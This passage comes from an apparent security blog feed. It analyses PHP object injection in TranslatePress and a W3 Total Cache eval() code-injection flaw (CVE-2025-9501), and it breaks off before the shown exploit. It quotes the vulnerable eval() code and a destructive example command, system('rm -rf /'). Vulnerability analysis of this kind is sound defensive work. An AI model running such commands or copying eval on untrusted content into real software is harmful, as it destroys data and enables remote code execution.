width=&#34;1073&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Output&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;The vulnerability originates from directly using &lt;code&gt;unserialize()&lt;/code&gt; on user-controlled input without additional validation, enabling arbitrary object instantiation and potential remote code execution if a crafted payload is supplied. Combined with CSRF, an attacker could trick an admin into executing the payload silently. Switching to &lt;code&gt;json_decode()&lt;/code&gt; in version 2.9.7 removes the attack surface entirely and properly resolves the issue.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;unserialize()&lt;/code&gt; on untrusted input always carries Object Injection and RCE risks.&lt;/li&gt;&#xA;&lt;li&gt;User input must be validated and sanitized before processing.&lt;/li&gt;&#xA;&lt;li&gt;CSRF can escalate an “authenticated exploit” into a “silent exploitation” scenario.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;json_decode()&lt;/code&gt; is a safer choice for structured data exchange.&lt;/li&gt;&#xA;&lt;li&gt;Comparing code differences between vulnerable and patched versions helps quickly identify root causes and solutions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/translatepress-multilingual/vulnerability/wordpress-translatepress-2-9-6-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TranslatePress Plugin &amp;lt;= 2.9.6 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9501 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-22-cve-2025-9501/</link>
      <pubDate>Sat, 22 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-22-cve-2025-9501/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The WordPress W3 Total Cache plugin prior to version 2.8.13 has a command injection vulnerability via the &lt;code&gt;_parse_dynamic_mfunc&lt;/code&gt; function, allowing unauthenticated users to execute PHP commands by submitting a comment with a malicious payload.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9501&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9501&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.8.12&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.8.13&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/w3-total-cache/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress W3 Total Cache Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;W3 Total Cache&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.8.12&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.8.13&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability originates from the &lt;code&gt;_parse_dynamic_mfunc&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function _parse_dynamic_mfunc( $matches ) {&#xA;    $code1 = trim( $matches[1] );&#xA;    $code2 = trim( $matches[2] );&#xA;    $code  = ( $code1 ? $code1 : $code2 );&#xA;&#xA;    if ( $code ) {&#xA;        $code = trim( $code, &amp;#39;;&amp;#39; ) . &amp;#39;;&amp;#39;;&#xA;&#xA;        try {&#xA;            ob_start();&#xA;            $result = eval( $code );&#xA;            $output = ob_get_contents();&#xA;            ob_end_clean();&#xA;        } catch ( \Exception $ex ) {&#xA;            $result = false;&#xA;        }&#xA;&#xA;        if ( false === $result ) {&#xA;            $output = sprintf( &amp;#39;Unable to execute code: %s&amp;#39;, htmlspecialchars( $code ) );&#xA;        }&#xA;    } else {&#xA;        $output = htmlspecialchars( &amp;#39;Invalid mfunc tag syntax. The correct format is: &amp;lt;!-- W3TC_DYNAMIC_SECURITY mfunc PHP code --&amp;gt;&amp;lt;!-- /mfunc W3TC_DYNAMIC_SECURITY --&amp;gt; or &amp;lt;!-- W3TC_DYNAMIC_SECURITY mfunc --&amp;gt;PHP code&amp;lt;!-- /mfunc W3TC_DYNAMIC_SECURITY --&amp;gt;.&amp;#39; );&#xA;    }&#xA;&#xA;    return $output;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;eval()&lt;/code&gt; function at line 11 is very dangerous as it executes a string as PHP code. Example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$command = &amp;#39;system(&amp;#34;rm -rf /&amp;#34;)&amp;#39;;&#xA;eval($command);&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;When the plugin is installed and activated, it adds to the top of &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;/** Enable W3 Total Cache */&#xA;define(&amp;#39;WP_CACHE&amp;#39;, true); // Added by W3 Total Cache&#xA;...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This registers caching for WordPress. &lt;code&gt;WP_CACHE&lt;/code&gt; is used in &lt;code&gt;wp-settings.php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( WP_CACHE &amp;amp;&amp;amp; apply_filters( &amp;#39;enable_loading_advanced_cache_dropin&amp;#39;, true ) &amp;amp;&amp;amp; file_exists( WP_CONTENT_DIR . &amp;#39;/advanced-cache.php&amp;#39; ) ) {&#xA;&#x9;include WP_CONTENT_DIR . &amp;#39;/advanced-cache.php&amp;#39;;&#xA;&#x9;if ( $wp_filter ) {&#xA;&#x9;&#x9;$wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter );&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WordPress automatically loads &lt;code&gt;advanced-cache.php&lt;/code&gt; if it exists. When activated, the plugin creates this file:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;defined( &amp;#39;ABSPATH&amp;#39; ) || die();&#xA;global $w3tc_start_microtime;&#xA;$w3tc_start_microtime = microtime( true );&#xA;&#xA;if ( defined( &amp;#39;WP_INSTALLING&amp;#39; ) &amp;amp;&amp;amp; WP_INSTALLING ) return;&#xA;&#xA;if ( ! defined( &amp;#39;W3TC_IN_MINIFY&amp;#39; ) ) {&#xA;&#x9;if ( ! defined( &amp;#39;W3TC_DIR&amp;#39; ) ) {&#xA;&#x9;&#x9;define( &amp;#39;W3TC_DIR&amp;#39;, ( defined( &amp;#39;WP_PLUGIN_DIR&amp;#39; ) ? WP_PLUGIN_DIR : WP_CONTENT_DIR . &amp;#39;/plugins&amp;#39; ) . &amp;#39;/w3-total-cache&amp;#39; );&#xA;&#x9;}&#xA;&#xA;&#x9;if ( ! @is_dir( W3TC_DIR ) || ! file_exists( W3TC_DIR . &amp;#39;/w3-total-cache-api.php&amp;#39; ) ) {&#xA;&#x9;&#x9;if ( defined( &amp;#39;WP_ADMIN&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;printf( &amp;#39;&amp;lt;strong&amp;gt;W3 Total Cache Error:&amp;lt;/strong&amp;gt; some files appear to be missing or out of place. Please re-install plugin or remove &amp;lt;strong&amp;gt;%s&amp;lt;/strong&amp;gt;. &amp;lt;br /&amp;gt;&amp;#39;, __FILE__ );&#xA;&#x9;&#x9;}&#xA;&#x9;} else {&#xA;&#x9;&#x9;require_once W3TC_DIR . &amp;#39;/w3-total-cache-api.php&amp;#39;;&#xA;&#x9;&#x9;if ( class_exists( &amp;#39;\W3TC\Dispatcher&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;$w3tc_redirect = \W3TC\Dispatcher::component( &amp;#39;Mobile_Redirect&amp;#39; );&#xA;&#x9;&#x9;&#x9;$w3tc_redirect-&amp;gt;process();&#xA;&#xA;&#x9;&#x9;&#x9;$w3tc_config = \W3TC\Dispatcher::config();&#xA;&#x9;&#x9;&#x9;if ( $w3tc_config-&amp;gt;get_boolean( &amp;#39;pgcache.enabled&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$o = \W3TC\Dispatcher::component( &amp;#39;PgCache_ContentGrabber&amp;#39; );&#xA;&#x9;&#x9;&#x9;&#x9;$o-&amp;gt;process();&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When page cache (&lt;code&gt;pgcache&lt;/code&gt;) is enabled, &lt;code&gt;$o-&amp;gt;process()&lt;/code&gt; handles page cache logic.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/page_cache.png&#34; title=&#34;Enable page cache&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/page_cache.png&#34; data-sub-html=&#34;&lt;h2&gt;Page Cache&lt;/h2&gt;&lt;p&gt;Enable page cache&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/page_cache.png&#39; alt=&#34;Page Cache&#34; height=&#34;593&#34; width=&#34;1227&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enable page cache&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;In &lt;code&gt;process()&lt;/code&gt;, the plugin prepares a mechanism to intercept page content before sending it to the browser:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function process() {&#xA;    $this-&amp;gt;run_extensions_dropin();&#xA;    ...&#xA;    Util_Bus::add_ob_callback( &amp;#39;pagecache&amp;#39;, array( $this, &amp;#39;ob_callback&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This registers a callback:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Util_Bus::add_ob_callback( &amp;#39;pagecache&amp;#39;, array( $this, &amp;#39;ob_callback&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Meaning:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Plugin registers a callback named &lt;code&gt;pagecache&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;The callback is the &lt;code&gt;ob_callback&lt;/code&gt; method of the current object.&lt;/li&gt;&#xA;&lt;li&gt;This is executed &lt;strong&gt;after WordPress generates the full HTML&lt;/strong&gt;, allowing the plugin to process it (optimize, compress, cache) before sending it to the client.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;add_ob_callback()&lt;/code&gt; simply stores the callback:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function add_ob_callback( $key, $callback ) {&#xA;    $GLOBALS[&amp;#39;_w3tc_ob_callbacks&amp;#39;][ $key ] = $callback;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;ob_callback()&lt;/code&gt; is triggered when the output buffer is flushed, checking for dynamic content:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ob_callback( $buffer ) {&#xA;    ...&#xA;    $has_dynamic = $this-&amp;gt;_has_dynamic( $buffer );&#xA;    ...&#xA;    if ( $has_dynamic ) {&#xA;        $this-&amp;gt;_shutdown_buffer = $buffer;&#xA;        $buffer = &amp;#39;&amp;#39;;&#xA;        register_shutdown_function(array($this, &amp;#39;shutdown&amp;#39;));&#xA;    }&#xA;    return $buffer;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;$buffer&lt;/code&gt; contains the full HTML WordPress generated.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;_has_dynamic()&lt;/code&gt; checks for non-cacheable sections:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function _has_dynamic( $buffer ) {&#xA;    if ( ! defined( &amp;#39;W3TC_DYNAMIC_SECURITY&amp;#39; ) ) return false;&#xA;    return preg_match(&#xA;        &amp;#39;~&amp;lt;!--\s*m(func|clude)\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/m(func|clude)\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;\s*--&amp;gt;~Uis&amp;#39;,&#xA;        $buffer&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Dynamic content format:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- mfunc{W3TC_DYNAMIC_SECURITY_VALUE} --&amp;gt; PHP code &amp;lt;!-- /mfunc{W3TC_DYNAMIC_SECURITY_VALUE} --&amp;gt;&#xA;or&#xA;&amp;lt;!-- mclude{W3TC_DYNAMIC_SECURITY_VALUE} --&amp;gt; PHP code &amp;lt;!-- /mclude{W3TC_DYNAMIC_SECURITY_VALUE} --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If no dynamic content → return buffer directly to cache.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If dynamic content:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Save full HTML to &lt;code&gt;_shutdown_buffer&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Return empty string temporarily&lt;/li&gt;&#xA;&lt;li&gt;Register &lt;code&gt;shutdown()&lt;/code&gt; to process after PHP request finishes&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function shutdown() {&#xA;    $compression = $this-&amp;gt;_page_key_extension[&amp;#39;compression&amp;#39;];&#xA;    $buffer = $this-&amp;gt;_parse_dynamic( $this-&amp;gt;_shutdown_buffer );&#xA;    $compressed_buffer = $this-&amp;gt;_compress( $buffer, $compression );&#xA;    echo $compressed_buffer;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;shutdown()&lt;/code&gt; calls &lt;code&gt;_parse_dynamic()&lt;/code&gt; to process dynamic HTML blocks and replace them with executed results:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function _parse_dynamic( $buffer ) {&#xA;    if ( ! defined( &amp;#39;W3TC_DYNAMIC_SECURITY&amp;#39; ) ) return $buffer;&#xA;    $buffer = preg_replace_callback(&amp;#39;~&amp;lt;!--\s*mfunc\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/mfunc\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;\s*--&amp;gt;~Uis&amp;#39;,&#xA;        array($this, &amp;#39;_parse_dynamic_mfunc&amp;#39;), $buffer);&#xA;    $buffer = preg_replace_callback(&amp;#39;~&amp;lt;!--\s*mclude\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/mclude\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;\s*--&amp;gt;~Uis&amp;#39;,&#xA;        array($this, &amp;#39;_parse_dynamic_mclude&amp;#39;), $buffer);&#xA;    return $buffer;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Each matched block is replaced by the executed content, ready for compression and output.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;User requests any front‑end page 